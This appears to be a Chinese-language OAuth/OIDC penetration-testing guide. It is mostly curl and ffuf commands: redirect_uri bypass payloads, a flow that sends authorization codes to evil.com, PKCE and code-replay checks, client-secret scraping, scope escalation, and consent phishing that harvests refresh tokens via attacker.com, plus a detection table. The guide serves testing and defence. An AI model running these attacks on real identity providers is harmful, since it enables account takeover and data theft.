# OAuth/OIDC 攻击链：从 redirect 到 token 滥用的完整路径

> 被 `competition-oauth-oidc-chain` 引用。目标是**一条能复盘的最小链**：入口 → redirect →
> callback → token/claim 被接受 → 得到的实际能力。每一跳都要有原始报文。

## 一、先画出链（不画就没法定位断点）

```
[1] 入口        GET /login?next=/dashboard
[2] 组装 authorize
     302 -> https://idp/authorize?
              response_type=code
              &client_id=app
              &redirect_uri=https://app/callback
              &scope=openid profile email
              &state=xyz &nonce=abc &code_challenge=...&code_challenge_method=S256
[3] IdP 登录 + 同意
     302 -> https://app/callback?code=CODE&state=xyz
[4] RP 后端换 token
     POST https://idp/token  (code + redirect_uri + client_id/secret + verifier)
     <- {access_token, id_token, refresh_token}
[5] 建立会话
     Set-Cookie: app_session=<JWT>; 或服务端 session
[6] 接受身份
     GET /api/v1/me -> 读 sub/email/role
```

**五个可篡改点**：`next`（入口）、`redirect_uri`（[2]）、`state/nonce`（[3]）、code（[4]）、
session/token（[5][6]）。逐个测，别一次改多处。

## 二、断点一：入口的 `next` 回跳（最省事的接管）

```bash
# 登录页的回跳参数
curl -i -s 'https://app.example.com/login?next=https://evil.com' | grep -i location
curl -i -s 'https://app.example.com/login?returnUrl=//evil.com' | grep -i location
curl -i -s 'https://app.example.com/login?redirect=https://evil.com' | grep -i location
```

如果 `next` 未校验，登录完成后的 302 会跳到外域——配合"隐式流"或"code 放在 query"
就能带出 token/code。

**判定**：`Location: https://evil.com` 且此时**已建立会话**（Set-Cookie 存在）。
只跳转不建会话只是普通开放重定向。

## 三、断点二：redirect_uri 的六类绕过（主战场）

### 3.1 分类与成功率

| # | 类型 | 载荷 | 生效条件 |
| --- | --- | --- | --- |
| 1 | 前缀匹配 | `https://app.example.com/callback.evil.com` | 服务端 `startsWith(registered)` |
| 2 | 路径追加 | `https://app.example.com/callback/../evil` | 未规范化就比对 |
| 3 | 子路径 | `https://app.example.com/callback/evil` | 同上 |
| 4 | 尾斜杠/参数 | `https://app.example.com/callback?x=1` | 只比对 pathname 前缀 |
| 5 | 子域 | `https://evil.app.example.com/cb` | 只校验根域 |
| 6 | 协议/端口 | `http://app.example.com:80/callback` | 未校验 scheme/port |
| 7 | 编码 | `https://app.example.com/%2E%2E%2Fevil` | 解码前后不一致 |
| 8 | 用户信息 | `https://app.example.com@evil.com/cb` | 解析器把 `@` 前当 userinfo |

### 3.2 高效打法

```bash
# 一次性打全部变体（注意 -mc 302,303 并过滤 IdP 自己的错误页）
cat > ru.txt <<'EOF'
https://app.example.com/callback.evil.com
https://app.example.com/callback/evil
https://app.example.com/callback?x=1
https://app.example.com/callback#x
https://evil.app.example.com/callback
http://app.example.com/callback
https://app.example.com:8443/callback
https://app.example.com%2F.evil.com/callback
https://app.example.com@evil.com/callback
https://app.example.com/callback%00.evil.com
EOF

ffuf -u 'https://idp.example.com/oauth/authorize?response_type=code&client_id=app&scope=openid&state=s1&redirect_uri=FUZZ' \
  -w ru.txt -mc 302 -fr 'error=' -H 'Cookie: sid='$SID -t 1
```

`-t 1` 很重要：IdP 上并发太高会触发风控，且 authorize 端点的 state 是一次性的。

### 3.3 不比对 redirect_uri 的回收利用

如果 authorize 时不校验，但**token 端点**校验——先 authorize 拿 code（redirect 指向自己），
再在 token 请求里用**注册的** redirect_uri 兑换。这是一个非常常见的组合：

```bash
# step1: authorize 用外域 redirect（IdP 不校验）→ 拿 code
curl -s -i 'https://idp.example.com/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://evil.com/cb&scope=openid' \
  -H 'Cookie: sid='$SID | grep -i location
# -> Location: https://evil.com/cb?code=STOLEN_CODE

# step2: 用合法 redirect_uri 兑换（token 端点只校验这一跳）
curl -s -X POST https://idp.example.com/oauth/token \
  -d 'grant_type=authorization_code&code=STOLEN_CODE' \
  -d 'redirect_uri=https://app.example.com/callback' \
  -d 'client_id=app&client_secret=SECRET'
```

**这个组合命中率很高**：两个端点各自"看起来安全"，合起来是完整的接管。

## 四、断点三：state / nonce / PKCE

| 缺失 | 攻击效果 | 最小验证 |
| --- | --- | --- |
| state 不校验 | Login CSRF：把攻击者的账号绑到受害者浏览器 | 用攻击者的 code + 任意 state 打到受害者的 callback |
| nonce 不校验 | ID token 重放 | 拿旧 id_token 直接喂 callback |
| PKCE 不校验 | 截获 code 即可兑换 | 用任意 verifier 换 token |
| PKCE plain 允许 | challenge == verifier，截获即用 | 请求里带 `code_challenge_method=plain` |

```bash
# PKCE 不校验：用错误 verifier 兑 code
curl -s -X POST https://idp.example.com/oauth/token \
  -d 'grant_type=authorization_code&code='$CODE \
  -d 'redirect_uri=https://app.example.com/callback' \
  -d 'client_id=app' -d 'code_verifier=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# 若返回 access_token → PKCE 没有真正校验
```

```bash
# 隐式流 token 泄露（response_type=token）
curl -s -i 'https://idp.example.com/oauth/authorize?response_type=token&client_id=app&redirect_uri=https://app.example.com/callback&scope=openid' \
  -H 'Cookie: sid='$SID | grep -i location
# -> https://app.example.com/callback#access_token=...&token_type=Bearer&expires_in=3600
```

拿到 fragment 里的 token 后要看**能不能打业务接口**——隐式流 token 往往 scope 很宽。

## 五、断点四：code 与 client 凭证

### 5.1 code 的四个属性

```bash
# ① 一次性：同一 code 兑换两次
curl -s -X POST https://idp/token -d 'grant_type=authorization_code&code='$CODE'&redirect_uri=...&client_id=app&client_secret=...'
curl -s -X POST https://idp/token -d 'grant_type=authorization_code&code='$CODE'&redirect_uri=...&client_id=app&client_secret=...'
# 第二次若成功 → 违反 RFC 6749，可重放

# ② 短时效：等待 > 60s 再兑换
sleep 90; curl -s -X POST ...

# ③ 绑定 client：用另一个 client_id 兑换
curl -s -X POST https://idp/token -d 'grant_type=authorization_code&code='$CODE'&client_id=OTHER_CLIENT&client_secret=OTHER_SECRET'

# ④ 绑定 redirect_uri：用不同 redirect_uri 兑换
curl -s -X POST https://idp/token -d 'grant_type=authorization_code&code='$CODE'&redirect_uri=https://evil.com/cb&client_id=app&client_secret=...'
```

### 5.2 客户端凭证泄露的位置（按实战频率）

| 位置 | 怎么找 | 备注 |
| --- | --- | --- |
| 前端 bundle | `grep -rE '(client_secret|clientSecret)' dist/` | SPA 里硬编码 secret 很常见 |
| APK/IPA | `strings` + `grep -i secret`；jadx 直接搜 | 移动端几乎必有 |
| 桌面客户端 | 资源文件、配置 ini | 见 `thick-client` |
| GitHub | `client_secret=` + 域名 | 用 GitHub code search |
| 公开文档/Postman | 公开 collection | — |

```bash
# 从 minified JS 里捞
grep -oE '(client_?[Ss]ecret)["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_\-\.]{20,}' app.js
```

拿到 secret 后：

```bash
# client_credentials 换 token（先试 scope 提升）
curl -s -X POST https://idp/token \
  -d 'grant_type=client_credentials&client_id=app&client_secret=SECRET' \
  -d 'scope=admin:read admin:write users:delete'
# 若返回 token 且 scope 被接受 → scope 越权
```

**scope 裁剪检查**：同一个 client 请求未注册的 scope，若 IdP 不拒绝而是全给，就是越权。

## 六、断点五：同意钓鱼（consent phishing）

不依赖任何技术漏洞，只依赖"用户会点授权"。

```
[1] 攻击者注册一个 client（合法，回调到自己的域）
[2] 构造 authorize 链接，scope 拉满：
    https://idp/oauth/authorize?
      client_id=ATTACKER_APP
      &redirect_uri=https://attacker.com/cb
      &response_type=code
      &scope=openid profile email offline_access <业务关键 scope>
      &prompt=consent
[3] 发给受害者（"点这里查看共享文档"）
[4] 受害者登录并同意 → code 落到 attacker.com
[5] 攻击者换 token，拿到 refresh_token 长期访问
```

**关键在 scope**：`offline_access` 才能拿 refresh_token；业务 scope（`mail.read`、
`files.read`、`drive`）才构成实质影响。只要 `openid profile` 影响等级很低。

**判定要件**：

- 攻击者 client 是**真实注册的**（不是伪造）
- 受害者**确实点了同意**（IdP 同意日志可查）
- 拿到 refresh_token 且**能重复换 access_token**
- 用该 token 读到了受害者的**非公开数据**

```bash
# 用 refresh_token 持续换（证明长期性）
for i in 1 2 3; do
  curl -s -X POST https://idp/token \
    -d 'grant_type=refresh_token&refresh_token='$RT'&client_id=ATTACKER_APP&client_secret=...' \
    | jq -r '.access_token' | cut -c1-30
  sleep 2
done
```

## 七、验伤：token → 权限的证明

### 7.1 必须记录的 token 字段

```bash
# access_token 通常是 JWT 或 opaque
# JWT：解码看
python3 -c "
import base64,json,sys
t=sys.argv[1].split('.')[1]
print(json.dumps(json.loads(base64.urlsafe_b64decode(t+'='*(-len(t)%4))),indent=2,ensure_ascii=False))
" "$AT"
# 关注：iss / aud / sub / scope / exp / azp / tid

# opaque：调 introspection 端点（若有）
curl -s -X POST https://idp/introspect -d 'token='$AT'&client_id=app&client_secret=...'
```

| 字段 | 为什么必须记 |
| --- | --- |
| `iss` | 哪个 IdP 发的（多 IdP 场景的关键） |
| `aud` | 给谁用的（能否跨服务复用） |
| `sub` | 身份主键（换 sub 就是换人） |
| `scope` | 授权范围（决定影响） |
| `exp` | 有效期（决定能否长期利用） |
| `azp` | 授权的 client（同意钓鱼的证据） |
| `tid`/`tenant` | 租户边界 |

### 7.2 从 token 到能力的闭环

```bash
# 用 token 打三个层级，证明能力递进
# L1 读自己
curl -s https://api.example.com/api/v1/me -H "Authorization: Bearer $AT" | jq '{email,role}'
# L2 读别人的（BOLA）
curl -s https://api.example.com/api/v1/users/1001 -H "Authorization: Bearer $AT" | jq '{email}'
# L3 写操作（真正的危害）
curl -s -X PATCH https://api.example.com/api/v1/users/1001 \
  -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com"}' | jq .
```

**只有 L2/L3 成功才算"token 有目标权限"**。L1 成功只证明 token 有效。

### 7.3 假象清单

| 假象 | 真相 |
| --- | --- |
| 拿到 access_token 就宣称接管 | token 可能只有 `openid` scope，读不到任何业务数据 |
| callback 页显示"登录成功" | SPA 前端路由放行，后端 /api 全 401 |
| refresh_token 换到了新 token | 新 token 的 scope 被收窄了（要看 scope 字段） |
| IdP 返回 302 到 evil.com | 可能是 `error=invalid_request` 的错误跳转 |
| 同意钓鱼"成功" | 受害者只是登录了，没点同意（看 IdP 的 consent 日志） |

## 八、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| redirect_uri 绕过 | IdP authorize 日志 | 请求的 redirect_uri **不精确等于**注册值；Location host 不在白名单 |
| code 重放 | IdP token 端点 | 同一 code 两次兑换（第二次应 `invalid_grant`） |
| PKCE 不校验 | IdP token 端点 | `code_verifier` 的 SHA256 与 challenge 不匹配但成功 |
| state 缺失 | IdP + RP | 同一 state 复用；callback 的 state 不在服务端会话里 |
| nonce 缺失 | RP | 同一 `jti`/`nonce` 出现在两个会话 |
| client_secret 滥用 | IdP | 单 client 从异常 IP/UA 调 token；client_credentials 拿到超范围 scope |
| 同意钓鱼 | IdP consent 日志 | 新 client 首次授权 + 高 scope + 短时大量不同用户 |
| 隐式流泄露 | 代理/Referer | `#access_token` 出现在日志；`response_mode=query` 的 code 进 Referer |
| refresh 滥用 | IdP | 同一 refresh_token 高频兑换；兑换 IP 与授权时 IP 地理跳变 |

## 九、常见坑

1. **停在 callback 不换 token**——code 不是身份。链必须走到"用 access_token 读到目标数据"。
2. **redirect_uri 变体没做 URL 编码**——`https://app/cb?x=1` 里的 `?` 必须 `%3F`，否则被当成 authorize 的参数。两种（编码/不编码）都发。
3. **token 端点要求 `redirect_uri` 完全一致**——authorize 时用什么，兑换时就得用什么，包括尾斜杠。这是最常见的"换 token 失败"原因。
4. **code 有效期只有 30-60 秒**——抓包到兑换必须快，别在 Burp 里慢慢改。先准备好请求模板。
5. **同意钓鱼忘了 `prompt=consent`**——已授权过的用户不会再弹同意页，会直接返回 code（这反而是更好的结果，说明"静默授权"）。
6. **PKCE 测试把 `code_challenge` 也算错**——`S256` 的 challenge 是 `base64url(sha256(verifier))` 去掉 padding，不是 hex。
7. **把 IdP 的 302 当成功**——必须看 `Location` 里的 host 和是否带 `code`。`error=access_denied` 也是 302。